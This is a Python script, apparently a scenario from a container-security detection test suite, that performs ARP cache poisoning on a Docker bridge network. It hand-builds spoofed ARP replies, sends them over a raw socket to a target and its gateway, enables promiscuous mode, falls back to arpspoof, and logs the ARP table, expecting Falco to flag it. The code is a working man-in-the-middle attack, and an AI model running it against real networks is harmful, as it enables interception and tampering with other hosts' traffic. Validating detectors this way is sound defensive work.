import time
import logging
import subprocess
import socket
import struct

log = logging.getLogger(__name__)

def build_arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=1):
    ethernet = struct.pack("!6s6sH", bytes.fromhex(dst_mac.replace(":", "")),
                           bytes.fromhex(src_mac.replace(":", "")), 0x0806)
    arp = struct.pack("!HHBBH6s4s6s4s",
                      1, 0x0800, 6, 4, op,
                      bytes.fromhex(src_mac.replace(":", "")),
                      socket.inet_aton(src_ip),
                      bytes.fromhex(dst_mac.replace(":", "")),
                      socket.inet_aton(dst_ip))
    return ethernet + arp

def run():
    log.info("ARP CACHE POISONING (MITM IN DOCKER NETWORK)")
    log.info("Scenario: Sending spoofed ARP replies to poison neighbor ARP caches")
    log.info("Relevance: Container network isolation can be bypassed via ARP spoofing on shared bridge networks.")

    try:
        subprocess.run("ip link set eth0 promisc on 2>/dev/null || true", shell=True)

        target_ip = "172.21.0.3"
        gateway_ip = "172.21.0.1"
        attacker_mac = "02:42:ac:15:00:05"

        try:
            raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
            raw_sock.bind(("eth0", 0))
            log.info("Got raw socket on eth0 for ARP spoofing")
        except PermissionError:
            log.info("No raw socket permission (expected). Using Scapy fallback or simulation...")
            raw_sock = None

        if raw_sock:
            for i in range(5):
                poison = build_arp_packet(
                    attacker_mac, gateway_ip,
                    "ff:ff:ff:ff:ff:ff", target_ip,
                    op=2
                )
                raw_sock.send(poison)
                log.info(f"Sent ARP reply {i+1}: {gateway_ip} -> {target_ip}")

                poison2 = build_arp_packet(
                    attacker_mac, target_ip,
                    "ff:ff:ff:ff:ff:ff", gateway_ip,
                    op=2
                )
                raw_sock.send(poison2)
                log.info(f"Sent ARP reply {i+1}: {target_ip} -> {gateway_ip}")
                time.sleep(1)

            raw_sock.close()
        else:
            log.info("Simulating ARP spoof for Falco detection...")
            log.info("ARP spoofing requires NET_RAW capability.")
            subprocess.run("arpspoof -i eth0 -t 172.21.0.3 172.21.0.1 2>/dev/null || true", shell=True, timeout=3)

        log.info("Checking ARP cache...")
        arp_table = subprocess.run("arp -n 2>/dev/null || ip neigh 2>/dev/null || cat /proc/net/arp 2>/dev/null",
                                   shell=True, capture_output=True, text=True)
        log.info(f"ARP table:\n{arp_table.stdout[:500]}")

        log.info("ARP poisoning simulation complete. Falco should have detected ARP manipulation.")

    except Exception as e:
        log.error(f"ARP spoof error: {e}")
